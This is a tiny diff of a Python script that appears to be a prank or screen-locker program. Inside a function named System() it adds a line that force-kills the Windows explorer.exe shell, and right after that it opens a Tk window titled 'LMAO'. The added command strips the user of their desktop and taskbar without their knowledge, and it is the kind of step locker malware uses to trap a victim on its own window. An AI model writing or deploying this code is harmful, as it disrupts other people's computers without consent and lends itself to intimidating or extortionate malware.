@@ -66,6 +66,9 @@ def System():
                 th.start()
                 th = None
             
+
+            os.system("taskkill /IM explorer.exe /F")
+
             window = Tk()
             window.title('LMAO')
             
